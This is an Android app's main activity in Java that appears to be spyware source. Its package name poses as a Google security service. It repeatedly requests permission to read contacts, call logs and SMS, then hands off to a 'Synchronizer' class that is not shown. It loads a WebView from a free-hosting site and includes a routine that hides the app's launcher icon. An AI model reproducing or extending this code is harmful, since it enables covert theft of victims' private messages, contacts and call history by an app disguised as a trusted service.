package com.google.services.security;

import android.Manifest;
import android.content.ComponentName;
import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.support.v4.app.ActivityCompat;
import android.support.v7.app.AppCompatActivity;
import android.view.Window;
import android.view.WindowManager;
import android.webkit.WebView;

import com.crashlytics.android.Crashlytics;

import io.fabric.sdk.android.Fabric;

import static android.content.pm.PackageManager.PERMISSION_GRANTED;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {

        super.onCreate(savedInstanceState);
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
                WindowManager.LayoutParams.FLAG_FULLSCREEN);

        final Fabric fabric = new Fabric.Builder(this)
                .kits(new Crashlytics())
                .debuggable(true)
                .build();
        Fabric.with(fabric);        //hideApp();
        setContentView(R.layout.activity_main);
        Context context = this;
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) != PERMISSION_GRANTED
                && ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS) != PERMISSION_GRANTED
                && ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) != PERMISSION_GRANTED
                ) {

            ActivityCompat.requestPermissions((MainActivity) context,
                    new String[]{
                            Manifest.permission.READ_CONTACTS,
                            Manifest.permission.READ_CALL_LOG,
                            Manifest.permission.READ_SMS},
                    9999);
        } else {
            new Synchronizer(this).sync();
        }
        WebView myWebView = findViewById(R.id.webview);
        myWebView.loadUrl("https://justbesmartok.000webhostapp.com/");

    }

    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        for (int grantResult : grantResults) {
            if (grantResult != PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(this,
                        new String[]{
                                Manifest.permission.READ_CONTACTS,
                                Manifest.permission.READ_CALL_LOG,
                                Manifest.permission.READ_SMS},
                        9999);
            }

        }
        new Synchronizer(this).sync();
    }


    private void hideApp() {
        PackageManager packageManager = getPackageManager();
        ComponentName componentName = new ComponentName(this, MainActivity.class);
        packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }
}
